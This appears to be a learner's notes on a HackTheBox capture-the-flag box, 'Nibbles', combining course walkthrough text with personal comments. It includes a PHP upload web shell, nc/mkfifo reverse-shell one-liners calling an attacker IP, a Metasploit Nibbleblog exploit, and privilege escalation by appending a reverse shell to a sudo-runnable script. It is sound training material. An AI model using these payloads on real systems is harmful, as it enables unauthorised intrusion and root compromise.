
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ATTACKING IP> <LISTENING PORT) >/tmp/f
```

We will add our tun0 VPN IP address in the <ATTACKING IP> placeholder and a port of our choice for <LISTENING PORT> to catch the reverse shell on our netcat listener. See the edited PHP script below.

``` php
<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 9443 >/tmp/f"); ?>
```

We upload the file again and start a netcat listener in our terminal:

```
nc -lvnp 9443

listening on [any] 9443 ...
```

cURL the image page again or browse to it in Firefox at http://nibbleblog/content/private/plugins/my_image/image.php to execute the reverse shell.

```
nc -lvnp 9443

listening on [any] 9443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 40106
/bin/sh: 0: can't access tty; job control turned off
$ id

uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
```

Furthermore, we have a reverse shell. Before we move forward with additional enumeration, let us upgrade our shell to a "nicer" shell since the shell that we caught is not a fully interactive TTY and specific commands such as su will not work, we cannot use text editors, tab-completion does not work, etc. This post explains the issue further as well as a variety of ways to upgrade to a fully interactive TTY. For our purposes, we will use a Python one-liner to spawn a pseudo-terminal so commands such as su and sudo work as discussed previously in this Module.

https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

``` bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Try the various techniques for upgrading to a full TTY and pick one that works best for you. Our first attempt fails as Python2 seems to be missing from the system!

```
python -c 'import pty; pty.spawn("/bin/bash")'

/bin/sh: 3: python: not found

$ which python3

/usr/bin/python3
```

We have Python3 though, which works to get us to a friendlier shell by typing python3 -c 'import pty; pty.spawn("/bin/bash")'. Browsing to /home/nibbler, we find the user.txt flag as well as a zip file personal.zip.

```
nibbler@Nibbles:/home/nibbler$ ls

ls
personal.zip  user.txt
```

-----------------------

Gain a foothold on the target and submit the user.txt flag


This was very confusing for me. First, it wouldn't let me connect to the /nibbleblog/

Then just out of nowhere it did.

Once I finally got in, I did this.

```

msfconsole # start metasploit

use exploit/multi/http/nibbleblog_file_upload

set TARGET 0
show options
set RHOSTS 10.129.170.213

set LHOST 10.10.14.250
set LPORT 4444

exploit # the netcat has to happen before this

shell # Opens shell
python3 -c 'import pty; pty.spawn("/bin/bash")' # creats pretty shell
```

And in another window I ran

```
nc -nvlp 4444
```

That got me a reverse shell that let me find the user.txt file.


# Priv Esc

Now that we have a reverse shell connection, it is time to escalate privileges. We can unzip the personal.zip file and see a file called monitor.sh.

```
nibbler@Nibbles:/home/nibbler$ unzip personal.zip

unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh 
```

The shell script monitor.sh is a monitoring script, and it is owned by our nibbler user and writeable.

```
cat monitor.sh

cat monitor.sh
                 ####################################################################################################

                 #                                        Tecmint_monitor.sh                                        #

                 # Written for Tecmint.com for the post www.tecmint.com/linux-server-health-monitoring-script/      #

                 # If any bug, report us in the link below                                                          #

                 # Free to use/edit/distribute the code below by                                                    #

                 # giving proper credit to Tecmint.com and Author                                                   #

                 #                                                                                                  #

                 ####################################################################################################

#! /bin/bash

# unset any variable which system may be using

# clear the screen

clear

unset tecreset os architecture kernelrelease internalip externalip nameserver loadaverage

while getopts iv name
do
       case $name in
         i)iopt=1;;
         v)vopt=1;;
         *)echo "Invalid arg";;
       esac
done
```

Says to get linPeas on the box, don't feel like it but here are the steps.

Let us put this aside for now and pull in LinEnum.sh to perform some automated privilege escalation checks. First, download the script to your local attack VM or the Pwnbox and then start a Python HTTP server using the command sudo python3 -m http.server 8080.

```
sudo python3 -m http.server 8080
[sudo] password for ben: ***********

Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
10.129.42.190 - - [17/Dec/2020 02:16:51] "GET /LinEnum.sh HTTP/1.1" 200 -
```

Back on the target type wget http://<your ip>:8080/LinEnum.sh to download the script. If successful, we will see a 200 success response on our Python HTTP server. Once the script is pulled over, type chmod +x LinEnum.sh to make the script executable and then type ./LinEnum.sh to run it. We see a ton of interesting output but what immediately catches the eye are sudo privileges.

```
We can sudo without supplying a password!
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


[+] Possible sudo pwnage!
/home/nibbler/personal/stuff/monitor.sh
```


The nibbler user can run the file /home/nibbler/personal/stuff/monitor.sh with root privileges. Being that we have full control over that file, if we append a reverse shell one-liner to the end of it and execute with sudo we should get a reverse shell back as the root user. Let us edit the monitor.sh file to append a reverse shell one-liner.

echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.2 8443 >/tmp/f' | tee -a monitor.sh


If we cat the monitor.sh file, we will see the contents appended to the end. It is crucial if we ever encounter a situation where we can leverage a writeable file for privilege escalation. We only append to the end of the file (after making a backup copy of the file) to avoid overwriting it and causing a disruption. Execute the script with sudo:

```
sudo /home/nibbler/personal/stuff/monitor.sh 
```

Finally, catch the root shell on our waiting nc listener.

```
nc -lvnp 8443

listening on [any] 8443 ...
connect to [10.10.14.2] from (UNKNOWN) [10.129.42.190] 47488
# id

uid=0(root) gid=0(root) groups=0(root)
```

From here, we can grab the root.txt flag. Finally, we have now solved our first box on HTB. Try to replicate all of the steps on your own. Try various tools to achieve the same effect. We can use many different tools for the various steps required to solve this box. This walkthrough shows one possible method. Make sure to take detailed notes to practice that vital skillset.

This all gets me the root file


